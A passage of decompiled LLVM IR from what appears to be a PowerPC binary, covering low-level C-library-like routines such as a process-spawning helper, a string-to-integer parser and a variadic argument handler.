  %v8_1000f9d8 = call i32 @function_1000fca4(i32 ptrtoint ([8 x i8]* @global_var_1001a14c.776 to i32), i32 ptrtoint ([3 x i8]* @global_var_1001a154.777 to i32), i32 ptrtoint ([3 x i8]* @global_var_1001a158.778 to i32), i32 %arg1, i32 0)
  %v1_1000f9e0 = call i32 @function_1000c228(i32 127)
  br label %dec_label_pc_1000f9e4

dec_label_pc_1000f9e4:                            ; preds = %dec_label_pc_1000f98c, %dec_label_pc_1000f990
  store i32 268499440, i32* @lr, align 4
  %v2_1000f9ec = call i32 @function_1000ee08(i32 3, i32 1)
  store i32 268499452, i32* @lr, align 4
  %v2_1000f9f8 = call i32 @function_1000ee08(i32 2, i32 1)
  %v0_1000f9fc = load i32, i32* @r31, align 4
  store i32 268499472, i32* @lr, align 4
  %v4_1000fa0c = call i32 @function_100105f4(i32 %v0_1000f9fc)
  %v3_1000fa10 = icmp eq i32 %v4_1000fa0c, -1
  br i1 %v3_1000fa10, label %dec_label_pc_1000fa18, label %dec_label_pc_1000fa1c

dec_label_pc_1000fa18:                            ; preds = %dec_label_pc_1000f9e4
  store i32 -1, i32* %stack_var_-40, align 4
  br label %dec_label_pc_1000fa1c

dec_label_pc_1000fa1c:                            ; preds = %dec_label_pc_1000f9e4, %dec_label_pc_1000fa18
  store i32 268499496, i32* @lr, align 4
  %v2_1000fa24 = call i32 @function_1000ee08(i32 3, i32 %v2_1000f92c)
  store i32 268499508, i32* @lr, align 4
  %v2_1000fa30 = call i32 @function_1000ee08(i32 2, i32 %v2_1000f93c)
  store i32 268499520, i32* @lr, align 4
  %v2_1000fa3c = call i32 @function_1000ee08(i32 17, i32 %v2_1000f94c)
  %v3_1000fa40 = load i32, i32* %stack_var_-40, align 4
  br label %dec_label_pc_1000fa44

dec_label_pc_1000fa44:                            ; preds = %dec_label_pc_1000f904, %dec_label_pc_1000f960, %dec_label_pc_1000fa1c
  %v0_1000fa54 = phi i32 [ 1, %dec_label_pc_1000f904 ], [ -1, %dec_label_pc_1000f960 ], [ %v3_1000fa40, %dec_label_pc_1000fa1c ]
  store i32 %v0_1000f914, i32* @r31, align 4
  ret i32 %v0_1000fa54

; uselistorder directives
  uselistorder i32 %v0_1000f954, { 1, 0, 2 }
  uselistorder i32 %v2_1000f94c, { 1, 0, 2 }
  uselistorder i32 %v2_1000f93c, { 1, 0 }
  uselistorder i32 %v2_1000f92c, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_1000fca4, { 1, 0 }
  uselistorder i32 ()* @function_1000c130, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_1000ee08, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 14 }
  uselistorder label %dec_label_pc_1000fa44, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000fa1c, { 1, 0 }
  uselistorder label %dec_label_pc_1000f9e4, { 1, 0 }
}

define i32 @function_1000fa58(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000fa58:
  %r10.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* @r25, align 4
  store i32 10, i32* %r30.global-to-local, align 4
  store i32 1, i32* @r26, align 4
  store i32 %tmp, i32* %r31.global-to-local, align 4
  %v3_1000fa90 = load i32, i32* @global_var_1002b8c0, align 4
  store i32 %v3_1000fa90, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000fa9c

dec_label_pc_1000fa98:                            ; preds = %dec_label_pc_1000fa9c
  %v1_1000fa98 = add i32 %v0_1000fad0, 1
  store i32 %v1_1000fa98, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000fa9c

dec_label_pc_1000fa9c:                            ; preds = %dec_label_pc_1000fa58, %dec_label_pc_1000fa98
  %v0_1000fad0 = phi i32 [ %tmp, %dec_label_pc_1000fa58 ], [ %v1_1000fa98, %dec_label_pc_1000fa98 ]
  %v1_1000fa9c = inttoptr i32 %v0_1000fad0 to i8*
  %v2_1000fa9c = load i8, i8* %v1_1000fa9c, align 1
  %v3_1000fa9c = zext i8 %v2_1000fa9c to i32
  %v1_1000faa0 = mul nuw nsw i32 %v3_1000fa9c, 2
  %v2_1000faa4 = add i32 %v1_1000faa0, %v3_1000fa90
  %v3_1000faa4 = inttoptr i32 %v2_1000faa4 to i16*
  %v4_1000faa4 = load i16, i16* %v3_1000faa4, align 2
  %v1_1000faa8 = and i16 %v4_1000faa4, 32
  %v3_1000faa8 = icmp eq i16 %v1_1000faa8, 0
  br i1 %v3_1000faa8, label %dec_label_pc_1000fab0, label %dec_label_pc_1000fa98

dec_label_pc_1000fab0:                            ; preds = %dec_label_pc_1000fa9c
  %v3_1000fab0 = icmp eq i8 %v2_1000fa9c, 43
  br i1 %v3_1000fab0, label %dec_label_pc_1000fad0, label %dec_label_pc_1000fab8

dec_label_pc_1000fab8:                            ; preds = %dec_label_pc_1000fab0
  %v3_1000fab8 = icmp eq i8 %v2_1000fa9c, 45
  store i32 0, i32* @r28, align 4
  br i1 %v3_1000fab8, label %dec_label_pc_1000fad0, label %dec_label_pc_1000fad4

dec_label_pc_1000fad0:                            ; preds = %dec_label_pc_1000fab0, %dec_label_pc_1000fab8
  %storemerge = phi i32 [ 1, %dec_label_pc_1000fab8 ], [ 0, %dec_label_pc_1000fab0 ]
  store i32 %storemerge, i32* @r28, align 4
  %v1_1000fad0 = add i32 %v0_1000fad0, 1
  store i32 %v1_1000fad0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000fad4

dec_label_pc_1000fad4:                            ; preds = %dec_label_pc_1000fab8, %dec_label_pc_1000fad0
  %v1_1000fad4 = call i32 @__asm_rlwinm.(i32 10, i32 0, i32 28, i32 26)
  %v4_1000fad4 = icmp eq i32 %v1_1000fad4, 0
  br i1 %v4_1000fad4, label %dec_label_pc_1000fae0, label %dec_label_pc_1000fad4.dec_label_pc_1000fb1c_crit_edge

dec_label_pc_1000fad4.dec_label_pc_1000fb1c_crit_edge: ; preds = %dec_label_pc_1000fad4
  %v0_1000fb1c.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000fb1c

dec_label_pc_1000fae0:                            ; preds = %dec_label_pc_1000fad4
  %v0_1000fae0 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000fae0 = inttoptr i32 %v0_1000fae0 to i8*
  %v2_1000fae0 = load i8, i8* %v1_1000fae0, align 1
  %v0_1000fae4 = load i32, i32* %r30.global-to-local, align 4
  %v1_1000fae4 = add i32 %v0_1000fae4, 10
  store i32 %v1_1000fae4, i32* %r30.global-to-local, align 4
  %v3_1000fae8 = icmp eq i8 %v2_1000fae0, 48
  br i1 %v3_1000fae8, label %dec_label_pc_1000faf0, label %dec_label_pc_1000fb10

dec_label_pc_1000faf0:                            ; preds = %dec_label_pc_1000fae0
  %v1_1000faf0 = add i32 %v0_1000fae0, 1
  %v2_1000faf0 = inttoptr i32 %v1_1000faf0 to i8*
  %v3_1000faf0 = load i8, i8* %v2_1000faf0, align 1
  %v4_1000faf0 = zext i8 %v3_1000faf0 to i32
  store i32 %v1_1000faf0, i32* %r31.global-to-local, align 4
  %v1_1000faf4 = add i32 %v0_1000fae4, 8
  store i32 %v1_1000faf4, i32* %r30.global-to-local, align 4
  %v1_1000faf8 = or i32 %v4_1000faf0, 32
  %v3_1000fb00 = icmp eq i32 %v1_1000faf8, 120
  br i1 %v3_1000fb00, label %dec_label_pc_1000fb08, label %dec_label_pc_1000fb10

dec_label_pc_1000fb08:                            ; preds = %dec_label_pc_1000faf0
  %v1_1000fb08 = mul i32 %v1_1000faf4, 2
  store i32 %v1_1000fb08, i32* %r30.global-to-local, align 4
  %v1_1000fb0c = add i32 %v0_1000fae0, 2
  store i32 %v1_1000fb0c, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000fb10

dec_label_pc_1000fb10:                            ; preds = %dec_label_pc_1000faf0, %dec_label_pc_1000fae0, %dec_label_pc_1000fb08
  %v0_1000fbc415 = phi i32 [ %v1_1000faf0, %dec_label_pc_1000fb08 ], [ %tmp, %dec_label_pc_1000fae0 ], [ %v1_1000faf0, %dec_label_pc_1000faf0 ]
  %v0_1000fb10 = phi i32 [ %v1_1000fb08, %dec_label_pc_1000fb08 ], [ %v1_1000fae4, %dec_label_pc_1000fae0 ], [ %v1_1000faf4, %dec_label_pc_1000faf0 ]
  %tmp22 = icmp slt i32 %v0_1000fb10, 17
  br i1 %tmp22, label %dec_label_pc_1000fb1c, label %dec_label_pc_1000fb18

dec_label_pc_1000fb18:                            ; preds = %dec_label_pc_1000fb10
  store i32 16, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000fb1c

dec_label_pc_1000fb1c:                            ; preds = %dec_label_pc_1000fad4.dec_label_pc_1000fb1c_crit_edge, %dec_label_pc_1000fb10, %dec_label_pc_1000fb18
  %v0_1000fbc414 = phi i32 [ %tmp, %dec_label_pc_1000fad4.dec_label_pc_1000fb1c_crit_edge ], [ %v0_1000fbc415, %dec_label_pc_1000fb10 ], [ %v0_1000fbc415, %dec_label_pc_1000fb18 ]
  %v1_1000fb30 = phi i32 [ %v0_1000fb1c.pre, %dec_label_pc_1000fad4.dec_label_pc_1000fb1c_crit_edge ], [ %v0_1000fb10, %dec_label_pc_1000fb10 ], [ 16, %dec_label_pc_1000fb18 ]
  %v1_1000fb1c = add i32 %v1_1000fb30, -2
  store i32 0, i32* %r10.global-to-local, align 4
  %v2_1000fb24 = icmp ugt i32 %v1_1000fb1c, 34
  br i1 %v2_1000fb24, label %dec_label_pc_1000fbbc, label %dec_label_pc_1000fb2c

dec_label_pc_1000fb2c:                            ; preds = %dec_label_pc_1000fb1c
  %v2_1000fb30 = udiv i32 -1, %v1_1000fb30
  store i32 %v2_1000fb30, i32* @r29, align 4
  %v2_1000fb34 = mul i32 %v2_1000fb30, %v1_1000fb30
  %v1_1000fb38 = sub i32 -1, %v2_1000fb34
  %v1_1000fb3c = urem i32 %v1_1000fb38, 256
  store i32 %v1_1000fb3c, i32* @r27, align 4
  %v0_1000fb48.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000fb48

dec_label_pc_1000fb44:                            ; preds = %dec_label_pc_1000fbb4, %dec_label_pc_1000fb9c
  %v1_1000fb4c.pre = phi i32 [ %v1_1000fb4c, %dec_label_pc_1000fbb4 ], [ %v1_1000fb4c.pre.pre, %dec_label_pc_1000fb9c ]
  %v0_1000fb4c.pre = phi i32 [ %v2_1000fbb4, %dec_label_pc_1000fbb4 ], [ %v0_1000fb4c.pre.pre, %dec_label_pc_1000fb9c ]
  %v0_1000fb44 = phi i32 [ %v1_1000fb80, %dec_label_pc_1000fbb4 ], [ %v0_1000fb44.pre, %dec_label_pc_1000fb9c ]
  br label %dec_label_pc_1000fb48

dec_label_pc_1000fb48:                            ; preds = %dec_label_pc_1000fb2c, %dec_label_pc_1000fb44
  %v0_1000fbc412 = phi i32 [ %v0_1000fbc414, %dec_label_pc_1000fb2c ], [ %v0_1000fb44, %dec_label_pc_1000fb44 ]
  %v0_1000fb80 = phi i32 [ %v0_1000fb48.pre, %dec_label_pc_1000fb2c ], [ %v0_1000fb44, %dec_label_pc_1000fb44 ]
  %v1_1000fb4c = phi i32 [ %v2_1000fb30, %dec_label_pc_1000fb2c ], [ %v1_1000fb4c.pre, %dec_label_pc_1000fb44 ]
  %v0_1000fb8c = phi i32 [ 0, %dec_label_pc_1000fb2c ], [ %v0_1000fb4c.pre, %dec_label_pc_1000fb44 ]
  %v1_1000fb48 = inttoptr i32 %v0_1000fb80 to i8*
  %v2_1000fb48 = load i8, i8* %v1_1000fb48, align 1
  %v3_1000fb48 = zext i8 %v2_1000fb48 to i32
  %v3_1000fb4c = icmp ugt i32 %v0_1000fb8c, %v1_1000fb4c
  %v1_1000fb54 = add nuw nsw i32 %v3_1000fb48, 208
  %v1_1000fb58 = or i32 %v3_1000fb48, 32
  %v1_1000fb5c = urem i32 %v1_1000fb54, 256
  %tmp23 = icmp ult i32 %v1_1000fb5c, 10
  br i1 %tmp23, label %dec_label_pc_1000fb7c, label %dec_label_pc_1000fb6c

dec_label_pc_1000fb6c:                            ; preds = %dec_label_pc_1000fb48
  %tmp24 = icmp ult i32 %v1_1000fb58, 97
  br i1 %tmp24, label %dec_label_pc_1000fb7c, label %dec_label_pc_1000fb78

dec_label_pc_1000fb78:                            ; preds = %dec_label_pc_1000fb6c
  %v1_1000fb6c = add nsw i32 %v1_1000fb58, -87
  %v1_1000fb78 = urem i32 %v1_1000fb6c, 256
  br label %dec_label_pc_1000fb7c

dec_label_pc_1000fb7c:                            ; preds = %dec_label_pc_1000fb6c, %dec_label_pc_1000fb48, %dec_label_pc_1000fb78
  %v1_1000fbb4 = phi i32 [ 40, %dec_label_pc_1000fb6c ], [ %v1_1000fb5c, %dec_label_pc_1000fb48 ], [ %v1_1000fb78, %dec_label_pc_1000fb78 ]
  %v1_1000fb7c = load i32, i32* %r30.global-to-local, align 4
  %v2_1000fb7c = icmp slt i32 %v1_1000fbb4, %v1_1000fb7c
  %v1_1000fb80 = add i32 %v0_1000fb80, 1
  store i32 %v1_1000fb80, i32* %r31.global-to-local, align 4
  br i1 %v2_1000fb7c, label %dec_label_pc_1000fb88, label %dec_label_pc_1000fbbc

dec_label_pc_1000fb88:                            ; preds = %dec_label_pc_1000fb7c
  br i1 %v3_1000fb4c, label %dec_label_pc_1000fb9c, label %dec_label_pc_1000fb8c

dec_label_pc_1000fb8c:                            ; preds = %dec_label_pc_1000fb88
  %v1_1000fb90 = load i32, i32* @r27, align 4
  %v0_1000fb94.not = icmp ne i32 %v0_1000fb8c, %v1_1000fb4c
  %tmp25 = icmp ule i32 %v1_1000fbb4, %v1_1000fb90
  %or.cond = or i1 %tmp25, %v0_1000fb94.not
  br i1 %or.cond, label %dec_label_pc_1000fbb4, label %dec_label_pc_1000fb9c

dec_label_pc_1000fb9c:                            ; preds = %dec_label_pc_1000fb8c, %dec_label_pc_1000fb88
  %v0_1000fb9c = call i32 @function_1000c85c()
  %v0_1000fba0 = load i32, i32* @r28, align 4
  %v1_1000fba0 = load i32, i32* @r26, align 4
  %v2_1000fba0 = and i32 %v1_1000fba0, %v0_1000fba0
  store i32 %v2_1000fba0, i32* @r28, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  %v2_1000fbac = inttoptr i32 %v0_1000fb9c to i32*
  store i32 34, i32* %v2_1000fbac, align 4
  %v0_1000fb44.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_1000fb4c.pre.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_1000fb4c.pre.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000fb44

dec_label_pc_1000fbb4:                            ; preds = %dec_label_pc_1000fb8c
  %v2_1000fb8c = mul i32 %v1_1000fb7c, %v0_1000fb8c
  %v2_1000fbb4 = add i32 %v2_1000fb8c, %v1_1000fbb4
  store i32 %v2_1000fbb4, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000fb44

dec_label_pc_1000fbbc:                            ; preds = %dec_label_pc_1000fb7c, %dec_label_pc_1000fb1c
  %v0_1000fbc4 = phi i32 [ %v0_1000fbc414, %dec_label_pc_1000fb1c ], [ %v0_1000fbc412, %dec_label_pc_1000fb7c ]
  %v0_1000fbbc = load i32, i32* @r25, align 4
  %v3_1000fbbc = icmp eq i32 %v0_1000fbbc, 0
  br i1 %v3_1000fbbc, label %dec_label_pc_1000fbc8, label %dec_label_pc_1000fbc4

dec_label_pc_1000fbc4:                            ; preds = %dec_label_pc_1000fbbc
  %v2_1000fbc4 = inttoptr i32 %v0_1000fbbc to i32*
  store i32 %v0_1000fbc4, i32* %v2_1000fbc4, align 4
  br label %dec_label_pc_1000fbc8

dec_label_pc_1000fbc8:                            ; preds = %dec_label_pc_1000fbbc, %dec_label_pc_1000fbc4
  %v0_1000fbc8 = load i32, i32* @r28, align 4
  %v1_1000fbc8 = sub i32 0, %v0_1000fbc8
  %v0_1000fbd0 = load i32, i32* @r26, align 4
  %v3_1000fbd0 = icmp eq i32 %v0_1000fbd0, 0
  %tmp27 = lshr i32 %v1_1000fbc8, 31
  %tmp28 = add nuw i32 %tmp27, 2147483647
  store i32 %tmp28, i32* @r31, align 4
  %v0_1000fc0c.pre.pre = load i32, i32* %r10.global-to-local, align 4
  br i1 %v3_1000fbd0, label %dec_label_pc_1000fbfc, label %dec_label_pc_1000fbe4

dec_label_pc_1000fbe4:                            ; preds = %dec_label_pc_1000fbc8
  %v3_1000fbe4 = icmp ugt i32 %v0_1000fc0c.pre.pre, %tmp28
  br i1 %v3_1000fbe4, label %dec_label_pc_1000fbec, label %dec_label_pc_1000fbfc

dec_label_pc_1000fbec:                            ; preds = %dec_label_pc_1000fbe4
  %v0_1000fbec = call i32 @function_1000c85c()
  %v2_1000fbf4 = inttoptr i32 %v0_1000fbec to i32*
  store i32 34, i32* %v2_1000fbf4, align 4
  %v0_1000fbf8 = load i32, i32* @r31, align 4
  store i32 %v0_1000fbf8, i32* %r10.global-to-local, align 4
  %v0_1000fbfc.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000fbfc

dec_label_pc_1000fbfc:                            ; preds = %dec_label_pc_1000fbc8, %dec_label_pc_1000fbe4, %dec_label_pc_1000fbec
  %v0_1000fc0c.pre = phi i32 [ %v0_1000fc0c.pre.pre, %dec_label_pc_1000fbe4 ], [ %v0_1000fbf8, %dec_label_pc_1000fbec ], [ %v0_1000fc0c.pre.pre, %dec_label_pc_1000fbc8 ]
  %v0_1000fbfc = phi i32 [ %v0_1000fbc8, %dec_label_pc_1000fbe4 ], [ %v0_1000fbfc.pre, %dec_label_pc_1000fbec ], [ %v0_1000fbc8, %dec_label_pc_1000fbc8 ]
  %v3_1000fbfc = icmp eq i32 %v0_1000fbfc, 0
  br i1 %v3_1000fbfc, label %dec_label_pc_1000fc08, label %dec_label_pc_1000fc04

dec_label_pc_1000fc04:                            ; preds = %dec_label_pc_1000fbfc
  %v1_1000fc04 = sub i32 0, %v0_1000fc0c.pre
  store i32 %v1_1000fc04, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1000fc08

dec_label_pc_1000fc08:                            ; preds = %dec_label_pc_1000fbfc, %dec_label_pc_1000fc04
  %v0_1000fc0c = phi i32 [ %v1_1000fc04, %dec_label_pc_1000fc04 ], [ %v0_1000fc0c.pre, %dec_label_pc_1000fbfc ]
  ret i32 %v0_1000fc0c

; uselistorder directives
  uselistorder i32 %v0_1000fc0c.pre, { 1, 0 }
  uselistorder i32 %v0_1000fc0c.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v2_1000fbb4, { 1, 0 }
  uselistorder i32 %v1_1000fb80, { 1, 0 }
  uselistorder i32 %v1_1000fb5c, { 1, 0 }
  uselistorder i32 %v1_1000fb58, { 1, 0 }
  uselistorder i32 %v3_1000fb48, { 1, 0 }
  uselistorder i32 %v0_1000fb8c, { 1, 0, 2 }
  uselistorder i32 %v1_1000fb4c, { 0, 2, 1 }
  uselistorder i32 %v0_1000fb44, { 1, 0 }
  uselistorder i32 %v2_1000fb30, { 1, 0, 2 }
  uselistorder i32 %v1_1000fb08, { 1, 0 }
  uselistorder i32 %v1_1000faf4, { 1, 0, 2 }
  uselistorder i32 %v0_1000fad0, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 7, 2, 3, 6, 4, 5, 8 }
  uselistorder i32* %r30.global-to-local, { 4, 1, 0, 2, 3, 5, 6, 7 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 5, 2, 3, 4, 6, 7 }
  uselistorder label %dec_label_pc_1000fc08, { 1, 0 }
  uselistorder label %dec_label_pc_1000fbfc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000fbc8, { 1, 0 }
  uselistorder label %dec_label_pc_1000fb7c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000fb48, { 1, 0 }
  uselistorder label %dec_label_pc_1000fb1c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000fb10, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000fad4, { 1, 0 }
  uselistorder label %dec_label_pc_1000fad0, { 1, 0 }
  uselistorder label %dec_label_pc_1000fa9c, { 1, 0 }
}

define i32 @function_1000fc20() local_unnamed_addr {
dec_label_pc_1000fc20:
  %stack_var_-40 = alloca i32, align 4
  %v2_1000fc3c = ptrtoint i32* %stack_var_-40 to i32
  %v0_1000fc44 = load i32, i32* @r3, align 4
  store i32 %v0_1000fc44, i32* @r31, align 4
  store i32 %v2_1000fc3c, i32* @r3, align 4
  %v0_1000fc50 = call i32 @function_10010048()
  %v0_1000fc58 = call i32 @function_10010040()
  %v3_1000fc60 = load i32, i32* @global_var_1002b93c.782, align 4
  %v3_1000fc64 = icmp eq i32 %v3_1000fc60, 0
  br i1 %v3_1000fc64, label %dec_label_pc_1000fc78, label %dec_label_pc_1000fc6c

dec_label_pc_1000fc6c:                            ; preds = %dec_label_pc_1000fc20
  %v0_1000fc6c = load i32, i32* @r31, align 4
  %v3_1000fc74 = call i32 @unknown_0(i32 %v0_1000fc6c, i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  br label %dec_label_pc_1000fc78

dec_label_pc_1000fc78:                            ; preds = %dec_label_pc_1000fc20, %dec_label_pc_1000fc6c
  store i32 %v2_1000fc3c, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v0_1000fc80 = call i32 @function_10010048()
  store i32 %v0_1000fc80, i32* @r3, align 4
  store i32 268500104, i32* @lr, align 4
  %v1_1000fc84 = call i32 @function_1000ffac(i32 %v0_1000fc80)
  store i32 268500124, i32* @lr, align 4
  %v2_1000fc98 = call i32 @function_1000ca44(i32 %v1_1000fc84, i32 268487236)
  %v0_1000fc9c = load i32, i32* @r31, align 4
  %v1_1000fca0 = call i32 @function_1000c228(i32 %v0_1000fc9c)
  ret i32 %v1_1000fca0

; uselistorder directives
  uselistorder label %dec_label_pc_1000fc78, { 1, 0 }
}

define i32 @function_1000fca4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_1000fca4:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg5, i32* %r8.global-to-local, align 4
  %stack_var_8 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000fca4 = ptrtoint i32* %stack_var_0 to i32
  %v2_1000fcc0 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1000fcc0, i32* %r0.global-to-local, align 4
  %v2_1000fcc8 = ptrtoint i32* %stack_var_8 to i32
  store i32 %v2_1000fcc0, i32* %stack_var_-48, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000fcf4

dec_label_pc_1000fcf4:                            ; preds = %dec_label_pc_1000fd24, %dec_label_pc_1000fca4
  %v0_1000fcf8 = phi i32 [ 0, %dec_label_pc_1000fca4 ], [ %v1_1000fcf8, %dec_label_pc_1000fd24 ]
  %stack_var_-52.0 = phi i32 [ %v2_1000fcc8, %dec_label_pc_1000fca4 ], [ %stack_var_-52.1, %dec_label_pc_1000fd24 ]
  %stack_var_-56.0 = phi i8 [ 2, %dec_label_pc_1000fca4 ], [ %stack_var_-56.1, %dec_label_pc_1000fd24 ]
  %v4_1000fcf4 = zext i8 %stack_var_-56.0 to i32
  %v1_1000fcf8 = add i32 %v0_1000fcf8, 1
  %v1_1000fd00 = mul nuw nsw i32 %v4_1000fcf4, 4
  store i32 %v1_1000fd00, i32* %r0.global-to-local, align 4
  %v2_1000fd04 = add i32 %v1_1000fd00, %v2_1000fcc0
  store i32 %v2_1000fd04, i32* %r11.global-to-local, align 4
  %tmp19 = icmp ugt i8 %stack_var_-56.0, 7
  br i1 %tmp19, label %dec_label_pc_1000fd18, label %dec_label_pc_1000fd10

dec_label_pc_1000fd10:                            ; preds = %dec_label_pc_1000fcf4
  %v1_1000fd08 = add i8 %stack_var_-56.0, 1
  br label %dec_label_pc_1000fd24

dec_label_pc_1000fd18:                            ; preds = %dec_label_pc_1000fcf4
  store i32 %stack_var_-52.0, i32* %r11.global-to-local, align 4
  %v1_1000fd1c = add i32 %stack_var_-52.0, 4
  store i32 %v1_1000fd1c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000fd24

dec_label_pc_1000fd24:                            ; preds = %dec_label_pc_1000fd10, %dec_label_pc_1000fd18
  %stack_var_-52.1 = phi i32 [ %v1_1000fd1c, %dec_label_pc_1000fd18 ], [ %stack_var_-52.0, %dec_label_pc_1000fd10 ]
  %v0_1000fd24 = phi i32 [ %stack_var_-52.0, %dec_label_pc_1000fd18 ], [ %v2_1000fd04, %dec_label_pc_1000fd10 ]
  %stack_var_-56.1 = phi i8 [ %stack_var_-56.0, %dec_label_pc_1000fd18 ], [ %v1_1000fd08, %dec_label_pc_1000fd10 ]
  %v1_1000fd24 = inttoptr i32 %v0_1000fd24 to i32*
  %v2_1000fd24 = load i32, i32* %v1_1000fd24, align 4
  store i32 %v2_1000fd24, i32* %r0.global-to-local, align 4
  %v3_1000fd28 = icmp eq i32 %v2_1000fd24, 0
  br i1 %v3_1000fd28, label %dec_label_pc_1000fd30, label %dec_label_pc_1000fcf4

dec_label_pc_1000fd30:                            ; preds = %dec_label_pc_1000fd24
  %v1_1000fd30 = mul i32 %v1_1000fcf8, 4
  store i32 %v4_1000fca4, i32* %r0.global-to-local, align 4
  %v1_1000fd38 = add i32 %v1_1000fd30, 34
  store i32 %v1_1000fcf8, i32* %ctr.global-to-local, align 4
  %v1_1000fd40 = call i32 @__asm_rlwinm(i32 %v1_1000fd38, i32 0, i32 0, i32 27)
  %v1_1000fd48 = load i32, i32* @r1, align 4
  %v3_1000fd48 = sub i32 %v1_1000fd48, %v1_1000fd40
  %v4_1000fd48 = inttoptr i32 %v3_1000fd48 to i32*
  store i32 %v4_1000fca4, i32* %v4_1000fd48, align 4
  %v1_1000fd4c = add i32 %v3_1000fd48, 23
  store i32 %v1_1000fd4c, i32* %r0.global-to-local, align 4
  %v1_1000fd50 = call i32 @__asm_rlwinm(i32 %v1_1000fd4c, i32 0, i32 0, i32 27)
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_1000fd58 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000fd58 = inttoptr i32 %v1_1000fd50 to i32*
  store i32 %v0_1000fd58, i32* %v2_1000fd58, align 4
  store i32 %v1_1000fd50, i32* %r11.global-to-local, align 4
  %v0_1000fd60 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000fd60 = trunc i32 %v0_1000fd60 to i8
  store i32 %v2_1000fcc0, i32* %r0.global-to-local, align 4
  store i32 %v2_1000fcc0, i32* %stack_var_-48, align 4
  br label %dec_label_pc_1000fd74

dec_label_pc_1000fd74:                            ; preds = %dec_label_pc_1000fda8.dec_label_pc_1000fd74_crit_edge, %dec_label_pc_1000fd30
  %v0_1000fd78 = phi i32 [ %v1_1000fd50, %dec_label_pc_1000fd30 ], [ %v0_1000fd78.pre, %dec_label_pc_1000fda8.dec_label_pc_1000fd74_crit_edge ]
  %stack_var_-52.2 = phi i32 [ %v2_1000fcc8, %dec_label_pc_1000fd30 ], [ %stack_var_-52.3, %dec_label_pc_1000fda8.dec_label_pc_1000fd74_crit_edge ]
  %stack_var_-56.2 = phi i8 [ %v1_1000fd60, %dec_label_pc_1000fd30 ], [ %stack_var_-56.3, %dec_label_pc_1000fda8.dec_label_pc_1000fd74_crit_edge ]
  %v1_1000fd78 = add i32 %v0_1000fd78, 4
  store i32 %v1_1000fd78, i32* %r11.global-to-local, align 4
  %tmp20 = icmp ugt i8 %stack_var_-56.2, 7
  br i1 %tmp20, label %dec_label_pc_1000fd9c, label %dec_label_pc_1000fd8c

dec_label_pc_1000fd8c:                            ; preds = %dec_label_pc_1000fd74
  %v4_1000fd74 = zext i8 %stack_var_-56.2 to i32
  %v1_1000fd84 = add i8 %stack_var_-56.2, 1
  %v1_1000fd80 = mul nuw nsw i32 %v4_1000fd74, 4
  %v3_1000fd8c = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_1000fd8c, i32* %r0.global-to-local, align 4
  %v2_1000fd94 = add i32 %v3_1000fd8c, %v1_1000fd80
  br label %dec_label_pc_1000fda8

dec_label_pc_1000fd9c:                            ; preds = %dec_label_pc_1000fd74
  %v1_1000fda0 = add i32 %stack_var_-52.2, 4
  store i32 %v1_1000fda0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000fda8

dec_label_pc_1000fda8:                            ; preds = %dec_label_pc_1000fd8c, %dec_label_pc_1000fd9c
  %stack_var_-52.3 = phi i32 [ %v1_1000fda0, %dec_label_pc_1000fd9c ], [ %stack_var_-52.2, %dec_label_pc_1000fd8c ]
  %v0_1000fda8 = phi i32 [ %stack_var_-52.2, %dec_label_pc_1000fd9c ], [ %v2_1000fd94, %dec_label_pc_1000fd8c ]
  %stack_var_-56.3 = phi i8 [ %stack_var_-56.2, %dec_label_pc_1000fd9c ], [ %v1_1000fd84, %dec_label_pc_1000fd8c ]
  %v1_1000fda8 = inttoptr i32 %v0_1000fda8 to i32*
  %v2_1000fda8 = load i32, i32* %v1_1000fda8, align 4
  store i32 %v2_1000fda8, i32* %r0.global-to-local, align 4
  %v2_1000fdac = inttoptr i32 %v1_1000fd78 to i32*
  store i32 %v2_1000fda8, i32* %v2_1000fdac, align 4
